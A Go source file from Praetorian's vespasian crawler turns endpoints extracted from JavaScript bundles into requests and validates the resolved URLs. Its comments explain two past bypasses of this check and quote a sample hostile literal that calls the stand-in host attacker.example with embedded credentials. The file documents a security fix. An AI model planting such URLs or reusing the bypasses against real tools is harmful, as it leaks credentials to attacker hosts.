// Copyright 2026 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package jsstatic

import (
	"encoding/json"
	"net/url"

	"github.com/praetorian-inc/vespasian/pkg/crawl"
)

// toRequests converts a slice of ExtractedEndpoint into crawl.ObservedRequest
// values. captureURL is the URL of the JS bundle that was analyzed; it is used
// to resolve relative endpoint URLs to absolute form.
//
// Rules:
//   - Source is taken directly from ExtractedEndpoint.SourceTag.
//   - If BodyFields is non-empty, a synthetic JSON body is constructed as
//     {"field": null, ...} with keys sorted lexicographically. This lets
//     pkg/generate/rest.InferSchema produce a real object schema.
//   - GET requests (and any method with zero BodyFields) receive a nil Body.
//   - Content-Type header is added when ExtractedEndpoint.ContentType is set.
//   - PageURL is propagated from ExtractedEndpoint.PageURL.
func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.ObservedRequest {
	if len(endpoints) == 0 {
		return nil
	}

	var bundleBase *url.URL
	if captureURL != "" {
		if parsed, err := url.Parse(captureURL); err == nil {
			bundleBase = parsed
		}
	}

	reqs := make([]crawl.ObservedRequest, 0, len(endpoints))
	for _, ep := range endpoints {
		req := crawl.ObservedRequest{
			Method:  ep.Method,
			Source:  ep.SourceTag,
			PageURL: ep.PageURL,
		}

		// Resolve URL: absolute URLs are preserved; relative URLs are resolved
		// against PageURL first (document-relative paths), falling back to the
		// bundle URL when PageURL is empty or unparseable.
		base := bundleBase
		if ep.PageURL != "" {
			if pageBase, err := url.Parse(ep.PageURL); err == nil && pageBase.Host != "" {
				base = pageBase
			}
		}
		req.URL = resolveURL(ep.URL, base)

		// SEC-BE-001 / SEC-BE-002: validate the RESOLVED URL — the value that
		// actually reaches every sink — not the pre-resolution literal.
		//
		// The previous fix gated ExtractedEndpoint.URL inside ExtractFromBundle and
		// keyed off an http(s):// prefix test, which a scheme-relative literal walks
		// straight past: `fetch("//u:p@attacker.example/api/collect")` has no scheme,
		// so the gate skipped it, and then resolveURL's base.ResolveReference COPIES
		// ref.User and inherits the base scheme — reconstituting
		// `https://u:p@attacker.example/api/collect` after the check had already run.
		// That candidate is floored to the default --confidence by classify Rule 7
		// (it is an IsJSStaticSource with an API-indicator path), reaches
		// OptionsProbe.probeURL where ssrf.ValidateURL inspects only scheme and
		// resolved IP and never u.User, and — because probe.Config.AuthHeaders is
		// populated by no non-test caller — makes net/http derive
		// `Authorization: Basic <base64(userinfo)>` from req.URL.User on every probe.
		// It also persisted to capture.json and put the attacker host in the spec's
		// servers list.
		//
		// Gating here instead is both correct and simpler: this is the single point
		// where the final URL exists, so there is exactly one check rather than one
		// per producer (which also removes the double validation of concat
		// endpoints, QUAL-001), and it cannot be bypassed by any spelling that
		// resolution turns into an absolute URL.
		//
		// Only credential/scheme/host VALIDITY and the byte policy are enforced here.
		// Same-origin remains a concat-only policy in extractConcatEndpoints — see
		// the note there for why AST literals must keep cross-origin recall.
		if !specSafeURL(req.URL) {
			continue
		}

		// Synthesize JSON body when BodyFields are present.
		if len(ep.BodyFields) > 0 {
			req.Body = synthBody(ep.BodyFields)
		}

		// Add Content-Type header when set.
		if ep.ContentType != "" {
			req.Headers = map[string]string{"Content-Type": ep.ContentType}
		}

		reqs = append(reqs, req)
	}
	return reqs
}

// resolveURL resolves rawURL relative to base. If rawURL is already absolute
// or base is nil, rawURL is returned unchanged.
func resolveURL(rawURL string, base *url.URL) string {
	if base == nil {
		return rawURL
	}
	ref, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	if ref.IsAbs() {
		return rawURL
	}
	return base.ResolveReference(ref).String()
}

// synthBody marshals a map of field-name → nil into a JSON object byte slice.
// Returns nil when fields is empty.
//
// Output is deterministic: encoding/json marshals map[string]interface{} with
// keys in sorted order, which is guaranteed by the Go specification ("The map
// keys are sorted and used as JSON object keys" —
// https://pkg.go.dev/encoding/json#Marshal). This guarantee holds regardless
// of the order of the input fields slice. In practice the current callers
// (collectObjectKeys) already return fields in sorted order, but that is a
// caller-side convention, not a correctness requirement here.
func synthBody(fields []string) []byte {
	if len(fields) == 0 {
		return nil
	}
	obj := make(map[string]interface{}, len(fields))
	for _, f := range fields {
		obj[f] = nil
	}
	b, err := json.Marshal(obj)
	if err != nil {
		return nil
	}
	return b
}

// specSafeURL reports whether a synthesized URL may be emitted. It is the single
// gate for every producer, applied in toRequests to the RESOLVED URL.
//
// Deliberately parse-based, with NO string-prefix test anywhere. That is the
// structural lesson from two successive bypasses of this gate: both were
// spellings that a `strings.HasPrefix(raw, "http://")`-style check classified as
// "not absolute" while url.Parse — and therefore every consumer downstream —
// disagreed.
//
//   - First bypass: the gate ran on the pre-resolution literal, so
//     `fetch("//u:p@attacker.example/api/collect")` skipped it and resolveURL's
//     base.ResolveReference then copied ref.User and inherited the base scheme.
//   - Second bypass: with the gate moved onto the resolved value, the same literal
//     still skipped it whenever the capture's own bundle URL was empty, because
//     resolveURL returns the literal UNCHANGED when base is nil — leaving it
//     scheme-relative, which the prefix test also does not match, even though
//     url.Parse reads Host="attacker.example" User=u:p from it.
//
// Asking url.Parse directly removes the whole class: whatever the spelling, if the
// parsed form carries userinfo it is rejected, and if it carries a host it must be
// http(s).
//
// Three rules:
//  1. Byte policy (crawl.IsPrintableASCIIURL) — no raw non-ASCII or control bytes
//     and no percent-escape decoding to them, so a hostile bundle cannot make a
//     spec path key or servers entry render differently from its bytes
//     (SEC-BE-002). Applied to all producers here; the concat producer's own
//     cleanConcatPath check is a stricter subset.
//  2. No userinfo, however spelled — this is the credential-injection sink:
//     ssrf.ValidateURL never inspects u.User and probe.Config.AuthHeaders is set
//     by no non-test caller, so net/http would derive `Authorization: Basic` from
//     req.URL.User on every probe (SEC-BE-001).
//  3. A URL that carries a host must be http or https. This catches the
//     scheme-relative form (host set, scheme empty) and any other scheme that
//     reached this point. A purely relative path (no host, no scheme) is fine and
//     is the common case.
func specSafeURL(raw string) bool {
	if !crawl.IsPrintableASCIIURL(raw) {
		return false
	}
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	if u.User != nil {
		return false
	}
	if u.Host != "" && u.Scheme != "http" && u.Scheme != "https" {
		return false
	}
	return true
}
